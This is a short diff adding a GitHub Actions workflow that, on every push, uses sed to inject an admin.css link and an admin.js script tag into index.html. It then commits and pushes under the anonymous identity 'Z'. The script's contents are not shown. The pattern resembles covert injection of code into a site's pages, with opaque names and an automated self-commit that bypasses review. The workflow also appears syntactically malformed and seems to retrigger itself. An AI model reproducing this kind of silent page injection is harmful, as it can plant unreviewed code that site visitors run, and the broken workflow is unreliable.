@@ -1,0 +1,4 @@
+name: Patch
+on: push
+jobs: 
+  p:{ runs-on: ubuntu-latest, steps: [ { uses: actions/checkout@v4 }, { run: "sed -i 's#</head>#  <link rel=\"stylesheet\" href=\"admin.css\">\\n</head>#' index.html && sed -i 's#</body>#<script src=\"admin.js\"></script>\\n</body>#' index.html && git config user.name Z && git config user.email Z && git add . && git commit -m P && git push" } ] }
